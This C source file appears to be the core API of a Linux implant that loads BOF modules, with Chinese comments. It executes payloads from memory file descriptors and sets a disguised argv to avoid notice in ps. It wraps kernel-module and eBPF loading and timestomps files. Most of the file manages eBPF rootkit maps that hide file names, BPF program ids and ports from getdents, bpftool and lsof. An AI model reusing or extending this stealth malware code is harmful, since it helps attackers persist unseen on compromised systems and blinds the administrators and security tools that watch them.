/// Shared by AxExecFd and AxExecFdArgv so the digit loop exists once.
static void ax_fd_path(int fd, char *out) {
    // "/proc/self/fd/" + up to 10 digits + NUL
    ax_memset(out, 0, 40);
    out[0] = '/'; out[1] = 'p'; out[2] = 'r'; out[3] = 'o'; out[4] = 'c';
    out[5] = '/'; out[6] = 's'; out[7] = 'e'; out[8] = 'l'; out[9] = 'f';
    out[10] = '/'; out[11] = 'f'; out[12] = 'd'; out[13] = '/';
    int pos = 14;
    if (fd == 0) {
        out[pos++] = '0';
    } else {
        char tmp[12];
        int n = 0;
        int v = fd;
        while (v > 0 && n < 11) {
            tmp[n++] = (char)('0' + (v % 10));
            v /= 10;
        }
        while (n > 0) out[pos++] = tmp[--n];
    }
    out[pos] = '\0';
}

int AxExecFd(int fd) {
    char path[40];
    ax_fd_path(fd, path);
    char *const argv[] = { (char *)0 };
    char *const envp[] = { (char *)0 };
    return (int)sys_execve(path, argv, envp);
}

int AxExecFdArgv(int fd, char *const argv[], char *const envp[]) {
    char path[40];
    ax_fd_path(fd, path);
    // Unlike AxExecFd (argv = {NULL}, so the payload runs with an EMPTY cmdline,
    // which is itself conspicuous in ps), this form lets the caller set argv[0].
    char *const def_argv[] = { (char *)0 };
    char *const def_envp[] = { (char *)0 };
    if (!argv) argv = def_argv;
    if (!envp) envp = def_envp;
    return (int)sys_execve(path, argv, envp);
}

int AxSetsid(void) {
    return sys_setsid();
}

int AxDup2(int oldfd, int newfd) {
    return sys_dup2(oldfd, newfd);
}

int AxPipe(int fds[2]) {
    if (!fds) return -1;
    return sys_pipe2(fds, 0);
}

int AxGetRandom(void *buf, int len) {
    if (!buf || len <= 0) return -1;
    long r = sys_getrandom(buf, (unsigned long)len, 0);
    return (int)r;
}

int AxUtimensat(int dirfd, const char *path,
                long atime_sec, long atime_nsec,
                long mtime_sec, long mtime_nsec) {
    struct linux_timespec ts[2];
    ts[0].tv_sec = atime_sec;
    ts[0].tv_nsec = atime_nsec;
    ts[1].tv_sec = mtime_sec;
    ts[1].tv_nsec = mtime_nsec;
    return sys_utimensat(dirfd, path, ts, 0);
}

int AxChmod(const char *path, int mode) {
    if (!path) return -1;
    return sys_fchmodat(-100 /* AT_FDCWD */, path, mode, 0);
}

long AxFinitModule(int fd, int flags) {
    if (fd < 0) return -1;
    return sys_finit_module(fd, "", flags);
}

long AxBpf(int cmd, void *attr, unsigned int size) {
    if (!attr) return -1;
    return sys_bpf(cmd, attr, size);
}

long AxPerfEventOpen(void *attr, int pid, int cpu, int group_fd, unsigned long flags) {
    if (!attr) return -1;
    return sys_perf_event_open(attr, pid, cpu, group_fd, flags);
}

int AxUnlink(const char *path) {
    if (!path) return -1;
    return sys_unlink(path);
}

int AxAccess(const char *path, int mode) {
    if (!path) return -1;
    return sys_access(path, mode);
}

int AxSymlink(const char *target, const char *linkpath) {
    if (!target || !linkpath) return -1;
    return sys_symlinkat(target, -100 /* AT_FDCWD */, linkpath);
}

long AxIoctl(int fd, unsigned long request, void *arg) {
    return (long)sys_ioctl(fd, request, (unsigned long)arg);
}

// ---- G7 闭环：hide_names 自动登记 --------------------------------------
//
// 为什么在 core 而不是各 BOF 里各写一份：见 bof_api.h 的说明（key 格式漂移 =
// 静默不隐藏）。
//
// **刻意不缓存 map fd**：缓存会让 agent 进程常驻一个 bpf-map anon_inode —— 那正是
// 门 S2 的 lsof 项，ISS-060 刚堵上（p18 T4 在盯）。这里每次 OBJ_GET -> UPDATE ->
// close，多几个 syscall 换 fd 表干净；只把 pin **名**留在内存里。

#define AX_G7_NAME_LEN   64
#define AX_G7_MAX_ENTRY  32
#define AX_G7_OBJ_GET    7
#define AX_G7_MAP_UPDATE 2
#define AX_G7_OBJ_INFO   15
#define AX_G7_MAP_DELETE 3
#define AX_G7_MAP_HASH   1

struct ax_g7_attr_get  { unsigned long pathname; unsigned int bpf_fd; unsigned int file_flags; };
struct ax_g7_attr_upd  { unsigned long map_fd; unsigned long key; unsigned long value; unsigned long flags; };
// DELETE 的 attr：**必须和 upd 一样宽（32 字节）**，多出来的字段清零。
// 内核拿用户给的 size 与 offsetofend(bpf_attr, MAP_DELETE_ELEM_LAST_FIELD)=32 比对，
// 给**小了**当场 EINVAL。第一版只声明 {map_fd, key}（16 字节），实测症状是
// "hide_add 计数 +1 成功、hide_del 计数**纹丝不动**"（p21 T6 k6=10 k7=10）——
// 而且这条路径不报错，只表现为"键没删掉"。所以判据必须**数元素个数**，不能看回执。
struct ax_g7_attr_del  { unsigned long map_fd; unsigned long key;
                         unsigned long value; unsigned long flags; };
struct ax_g7_attr_info { unsigned int bpf_fd; unsigned int info_len; unsigned long info; };
struct ax_g7_dirent    { unsigned long d_ino; long d_off; unsigned short d_reclen;
                         unsigned char d_type; char d_name[]; };

// map info 的公共前缀与 bofs/ebpf_load.c 同款：前两字段恒为 {type,id}，map 紧随
// 其后是 key/value/max_entries —— 身份判据要用到，所以不能只声明 8 字节。
struct ax_g7_map_info {
    unsigned int type, id, key_size, value_size, max_entries, map_flags;
    char name[16];
};

static char g_ax_g7_pin[128];   // ebpf_load 报上来的 / 首次显式传入的 pin 名
static int  g_ax_g7_dead = 0;   // 扫过一次没找到 -> 别对每个名字都重扫

int AxSetBpfPin(const char *pin) {
    int n;
    g_ax_g7_dead = 0;
    g_ax_g7_pin[0] = 0;
    if (!pin) return -1;
    n = AxStrlen(pin);
    if (n <= 0 || n >= (int)sizeof(g_ax_g7_pin)) return -1;
    AxStrcpy(g_ax_g7_pin, pin);
    return 0;
}

// ── P8 §6d：pin 注册表（让 D2 与加载顺序无关）─────────────────────────
// hide_names 有**多份**（每个模块实例各一张），但只有 **getdents 钩子**那一份
// 会被读 —— 也就是 `hide` 实例那张。别的实例的同名表**没人查**。
// 于是"加载时把自己的 pin 名藏起来"只在 hide 实例上真正生效，而加载顺序不可控：
//   hide 后加载 → 别的模块的 pin 名留着；hide 先加载 → 它只来得及藏自己。
// 注册表把两个方向都补上：
//   · 任何模块加载 → 登记自己的 pin；若 dirent pin 已知，顺手把自己的名字写进去
//   · getdents 模块加载 → 认领 dirent pin，并把**已登记的全部 pin** 写进自己这张
// 8 个槽位：实际部署 3~5 个模块。溢出时回执里的 hid/want 会明说（不静默）——
// 注意 hide_names 硬上限是 **32 条键**，8×10 会撞上限，这是已知边界。
#define AX_PINREG_MAX 8
static char g_ax_pinreg[AX_PINREG_MAX][64];
static int  g_ax_pinreg_n = 0;
static char g_ax_dirent[64];        // getdents 钩子那份 hide_names 的 pin

int AxPinRegAdd(const char *pin) {
    int n;
    if (!pin || !pin[0]) return -1;
    n = AxStrlen(pin);
    if (n >= (int)sizeof(g_ax_pinreg[0])) return -1;
    for (int i = 0; i < g_ax_pinreg_n; i++)
        if (AxStrcmp(g_ax_pinreg[i], pin) == 0) return 0;     // 幂等：重复加载同一 pin
    if (g_ax_pinreg_n >= AX_PINREG_MAX) return -1;            // 表满
    AxStrcpy(g_ax_pinreg[g_ax_pinreg_n], pin);
    g_ax_pinreg_n++;
    return 1;
}

int AxPinRegCount(void) { return g_ax_pinreg_n; }

const char *AxPinRegGet(int i) {
    if (i < 0 || i >= g_ax_pinreg_n) return 0;
    return g_ax_pinreg[i];
}

int AxPinRegDirent(const char *pin) {
    if (!pin || !pin[0]) return -1;
    if (AxStrlen(pin) >= (int)sizeof(g_ax_dirent)) return -1;
    if (g_ax_dirent[0] && AxStrcmp(g_ax_dirent, pin) == 0) return 0;
    AxStrcpy(g_ax_dirent, pin);
    return 1;
}

const char *AxPinRegDirentPin(void) { return g_ax_dirent[0] ? g_ax_dirent : 0; }

// ── P8 §6e：内核对象 id 注册表（让 D1 与「模块种类 + 加载顺序」都无关）───────
// §6d 管的是**名字**，这里管的是 **id** —— 同一形状的问题第二次出现：
// hidden_bpf_ids 也有**多份**（common.h 声明、每个模块实例各一张），而只有
// **sys_enter_bpf 钩子**那一份会被读，也就是 `bpf_filter` 实例那张。
// hide / knock / redact / tc_rewrite 的 prog 与 map id，只有写进 bpf_filter 的表
// 才会从 bpftool 枚举里消失。
//
// P8 把「扫 /sys/fs/bpf + 扇出到每个 *_map1」换成 fd 直取之后，每个实例只登记自己
// —— 于是**两个模块同时加载**时，非 bpf_filter 那个的 prog 会露出来。
// （p21 双模块实测：基线 13 → 14，多出来的正是 hide 的 prog id。）
// §2.1 里「跨实例扇出多余」那句话只对**多个 bpf_filter 实例**成立：每份钩子各查
// 各的表、各藏各的 prog。换个模块就不成立了 —— 它的钩子挂在别的事件上。
//
//   · 加载时 sink 未知 → 先登记，等 bpf_filter 加载时重放；
//   · 加载时 sink 已知 → 按路径开 <sink>_map1，当场写进去。
// 两个方向合起来：谁先加载、什么模块组合，prog/map id 都全藏。
//
// ⚠ 走**路径**（BPF_OBJ_GET）而不是存 fd：fd 是进程内的编号，别的代码一关一开
//   就可能被复用 → 悄悄写进一张不相干的表，而且**不报错**。§6b 同理。
#define AX_IDREG_MAX 48                // 一个模块约 10 条 → 4 个模块撞上限
#define AX_G7_ID_MAX_ENTRY 64          // hidden_bpf_ids = HASH(4 -> 1, 64)
static unsigned int g_ax_idreg[AX_IDREG_MAX];
static int  g_ax_idreg_n = 0;
static char g_ax_idreg_sink[64];       // 认领 sink 的那个 bpf_filter 实例的 pin

// 开 <pin>_map1。身份判据用**三元组**而不是名字：map_name[16] 会截断，历史上正因
// 硬比名字而静默失效过（ISS-043）。
static int ax_idreg_open(const char *pin) {
    char path[192];
    struct ax_g7_attr_get ga;
    struct ax_g7_map_info mi;
    struct ax_g7_attr_info ia;
    int fd;
    if (!pin || !pin[0]) return -1;
    if (AxStrlen(pin) + 32 > (int)sizeof(path)) return -1;
    AxStrcpy(path, "/sys/fs/bpf/");
    AxStrcat(path, pin);
    AxStrcat(path, "_map1");
    AxMemset(&ga, 0, sizeof(ga));
    ga.pathname = (unsigned long)path;
    fd = (int)AxBpf(AX_G7_OBJ_GET, &ga, sizeof(ga));
    if (fd < 0) return -1;
    AxMemset(&mi, 0, sizeof(mi));
    AxMemset(&ia, 0, sizeof(ia));
    ia.bpf_fd   = (unsigned int)fd;
    ia.info_len = (unsigned int)sizeof(mi);
    ia.info     = (unsigned long)&mi;
    if (AxBpf(AX_G7_OBJ_INFO, &ia, sizeof(ia)) < 0 ||
        mi.type != AX_G7_MAP_HASH || mi.key_size != 4 || mi.value_size != 1 ||
        mi.max_entries != AX_G7_ID_MAX_ENTRY) {
        AxCloseFile(fd);
        return -1;
    }
    return fd;
}

// 一个 id 写进一张 _map1：key = 4 字节 LE、value = 1（与 ebpf_load 的 ax_id_add 同款）
static int ax_idreg_put(int fd, unsigned int id) {
    struct ax_g7_attr_upd up;
    unsigned char v = 1;
    if (fd < 0 || id == 0) return -1;
    AxMemset(&up, 0, sizeof(up));
    up.map_fd = (unsigned long)fd;
    up.key    = (unsigned long)&id;
    up.value  = (unsigned long)&v;
    return (AxBpf(AX_G7_MAP_UPDATE, &up, sizeof(up)) < 0) ? -1 : 0;
}

// 登记 n 个 id，返回**写进 sink 的条数**（sink 未知时为 0），-1 = 参数非法。
// 去重：重放路径会反复登记同一批 id，不去重会白吃 48 条预算。
// 表满时**不再登记**（但已登记的照写），表满与否由 AxIdRegCount() 报出去。
int AxIdRegAdd(const unsigned int *ids, int n) {
    int put = 0, fd = -1;
    if (!ids || n <= 0) return -1;
    if (g_ax_idreg_sink[0]) fd = ax_idreg_open(g_ax_idreg_sink);   // 一次开、多次写
    for (int i = 0; i < n; i++) {
        unsigned int id = ids[i];
        int k, seen = 0;
        if (id == 0) continue;
        for (k = 0; k < g_ax_idreg_n; k++)
            if (g_ax_idreg[k] == id) { seen = 1; break; }
        if (!seen && g_ax_idreg_n < AX_IDREG_MAX) g_ax_idreg[g_ax_idreg_n++] = id;
        if (fd >= 0 && ax_idreg_put(fd, id) == 0) put++;
    }
    if (fd >= 0) AxCloseFile(fd);
    return put;
}

// bpf_filter 实例认领 sink：把**已登记**的 id 全部重放进 <pin>_map1。
// 返回写入条数；-1 = 路径/身份不对（那时不认领，后来的模块会走"先登记"那条路）。
int AxIdRegSink(const char *pin) {
    int fd, put = 0;
    if (!pin || !pin[0]) return -1;
    if (AxStrlen(pin) >= (int)sizeof(g_ax_idreg_sink)) return -1;
    fd = ax_idreg_open(pin);
    if (fd < 0) return -1;
    AxStrcpy(g_ax_idreg_sink, pin);
    for (int i = 0; i < g_ax_idreg_n; i++)
        if (ax_idreg_put(fd, g_ax_idreg[i]) == 0) put++;
    AxCloseFile(fd);
    return put;
}

int AxIdRegCount(void) { return g_ax_idreg_n; }

const char *AxIdRegSinkPin(void) { return g_ax_idreg_sink[0] ? g_ax_idreg_sink : 0; }

static int ax_g7_suffix(const char *nm, const char *suf) {
    int l = AxStrlen(nm), sl = AxStrlen(suf);
    if (l <= sl) return 0;
    for (int i = 0; i < sl; i++) if (nm[l - sl + i] != suf[i]) return 0;
    return 1;
}

// hide_names 的身份判据 = HASH(64 -> 1, max 32)，用**三元组**而不是名字：
// map_name[16] 会截断，历史上正因硬比名字而静默失效过（ISS-043）。其余 7 张表
// （hidden_bpf_ids 4->1/64、hidden_ports 2->1/64、knock_seen LRU_PERCPU 4->1/1024、
// redact_fds LRU_HASH 8->1/4096 …）与它互不冲突。
static int ax_g7_is_hide_map(int fd) {
    struct ax_g7_map_info mi;
    struct ax_g7_attr_info ia;
    AxMemset(&mi, 0, sizeof(mi));
    AxMemset(&ia, 0, sizeof(ia));
    ia.bpf_fd   = (unsigned int)fd;
    ia.info_len = (unsigned int)sizeof(mi);
    ia.info     = (unsigned long)&mi;
    if (AxBpf(AX_G7_OBJ_INFO, &ia, sizeof(ia)) < 0) return 0;
    return mi.type == AX_G7_MAP_HASH && mi.key_size == AX_G7_NAME_LEN &&
           mi.value_size == 1 && mi.max_entries == AX_G7_MAX_ENTRY;
}

// pin -> fd。**按路径取，不走 getdents**：hide_names 把 <pin>_map0 自己也藏起来之后，
// 路径查找照样通（过滤只作用在目录枚举上），这是"pin 隐藏"与"还能补写名字"能共存的前提。
static int ax_g7_open(const char *pin) {
    char path[192];
    struct ax_g7_attr_get ga;
    int fd;
    if (!pin || !pin[0]) return -1;
    if ((int)AxStrlen(pin) + 32 > (int)sizeof(path)) return -1;
    AxStrcpy(path, "/sys/fs/bpf/");
    AxStrcat(path, pin);
    AxStrcat(path, "_map0");
    AxMemset(&ga, 0, sizeof(ga));
    ga.pathname = (unsigned long)path;
    fd = (int)AxBpf(AX_G7_OBJ_GET, &ga, sizeof(ga));
    if (fd < 0) return -1;
    if (!ax_g7_is_hide_map(fd)) { AxCloseFile(fd); return -1; }
    return fd;
}

// 兜底发现：pin 名没记下来时扫 /sys/fs/bpf。**有前提** —— hide_names 一旦把
// `*_map0` 也登记进去（D2 的 pin 隐藏），getdents 就再也列不出它，本函数从此失效；
// 那种部署必须靠 AxSetBpfPin / 显式 pin 走 ax_g7_open。
static int ax_g7_scan(void) {
    char dirbuf[4096];
    int dfd = AxOpenDir("/sys/fs/bpf");
    int found = -1;
    if (dfd < 0) return -1;
    while (found < 0) {
        int nread = AxReadDir(dfd, dirbuf, (int)sizeof(dirbuf));
        int pos = 0;
        if (nread <= 0) break;
        while (pos < nread) {
            struct ax_g7_dirent *e = (struct ax_g7_dirent *)(dirbuf + pos);
            if (e->d_reclen == 0) break;
            if (e->d_name[0] != '.' && ax_g7_suffix(e->d_name, "_map0")) {
                char pin[128];
                int l = AxStrlen(e->d_name) - 5;    // 去掉 "_map0"
                if (l > 0 && l < (int)sizeof(pin)) {
                    AxMemcpy(pin, e->d_name, l);
                    pin[l] = 0;
                    found = ax_g7_open(pin);
                    if (found >= 0) { AxStrcpy(g_ax_g7_pin, pin); break; }
                }
            }
            pos += e->d_reclen;
        }
    }
    AxCloseFile(dfd);
    return found;
}

// hide_names 的 key 形状（64 字节定长、名字在前、NUL 填补到满）**只在这里拼一次**。
// P6 已经吃过一次教训：key 格式的第二份实现漂移了是**看不出来**的 —— MAP_UPDATE
// 照样返回 OK、回执照样打 [+]，只是过滤永远 miss。所以 Add / Del / fd 三版全走它。
static int ax_g7_key(char *key, const char *name) {
    int n;
    if (!name || !name[0]) return -1;
    AxMemset(key, 0, AX_G7_NAME_LEN);
    n = AxStrlen(name);
    if (n > AX_G7_NAME_LEN - 1) n = AX_G7_NAME_LEN - 1;
    AxMemcpy(key, name, n);
    return 0;
}

// ── P8：卸载侧的回收接口（handle 版）────────────────────────────────────
// 卸载的收尾顺序是「开 _map0 → unpin 全部 → 删 hide_names 的那 10 个键 → 关 fd」。
// unpin 一旦 unlink 掉 `<pin>_map0`，**按路径就再也打不开它了** —— 逐名重开的写法
// 只能把删键放在 unpin **之前**，那样 unpin 中途失败就会留下"文件还在、但已经不被
// 隐藏"的裸露状态（正好把 §I 的那一行又露回去）。握住 fd 跨过 unpin 就没有这个问题：
// map 对象由 fd 续命，「先 close 再 unlink」那条注释讲的是同一件事。
int AxHidePinOpen(const char *pin) {
    int fd;
    if (pin && pin[0] && AxStrcmp(pin, g_ax_g7_pin) != 0) AxSetBpfPin(pin);
    fd = ax_g7_open(g_ax_g7_pin);
    if (fd < 0 && !g_ax_g7_dead) {
        fd = ax_g7_scan();
        if (fd < 0) g_ax_g7_dead = 1;
    }
    return fd;
}

int AxHideFdAdd(int fd, const char *name) {
    char key[AX_G7_NAME_LEN];
    struct ax_g7_attr_upd up;
    unsigned char one = 1;
    if (fd < 0 || ax_g7_key(key, name) != 0) return -1;
    AxMemset(&up, 0, sizeof(up));
    up.map_fd = (unsigned long)fd;
    up.key    = (unsigned long)key;
    up.value  = (unsigned long)&one;
    return (AxBpf(AX_G7_MAP_UPDATE, &up, sizeof(up)) < 0) ? -1 : 0;
}

int AxHideFdDel(int fd, const char *name) {
    char key[AX_G7_NAME_LEN];
    struct ax_g7_attr_del de;
    if (fd < 0 || ax_g7_key(key, name) != 0) return -1;
    AxMemset(&de, 0, sizeof(de));
    de.map_fd = (unsigned long)fd;
    de.key    = (unsigned long)key;
    return (AxBpf(AX_G7_MAP_DELETE, &de, sizeof(de)) < 0) ? -1 : 0;
}

void AxHideFdClose(int fd) { if (fd >= 0) AxCloseFile(fd); }

int AxHideNameAdd(const char *pin, const char *name) {
    int fd, r;
    if (!name || !name[0]) return -1;
    // 显式 pin 与已记住的不同 -> 以显式的为准（同一进程内换 pin 属于误用，但与其
    // 写错表不如按最新指定来）。AxHidePinOpen 里已经这么做了，这里只做参数校验。
    fd = AxHidePinOpen(pin);
    if (fd < 0) return -2;
    r = AxHideFdAdd(fd, name);
    AxCloseFile(fd);
    return r;
}

// 路径版删除（每次开关一次 fd）。**卸载不要用它**，见 AxHidePinOpen 上面那段。
int AxHideNameDel(const char *pin, const char *name) {
    int fd, r;
    if (!name || !name[0]) return -1;
    fd = AxHidePinOpen(pin);
    if (fd < 0) return -2;
    r = AxHideFdDel(fd, name);
    AxCloseFile(fd);
    return r;
}

/// Resolve a BOF symbol by name. Returns function pointer or NULL.
void *bof_resolve_symbol(const char *name) {
    if (!name)
        return (void *)0;
    for (int i = 0; bof_api_table[i].name != (const char *)0; i++) {
        if (ax_strcmp(name, bof_api_table[i].name) == 0)
            return bof_api_table[i].func;
    }
    return (void *)0;
}
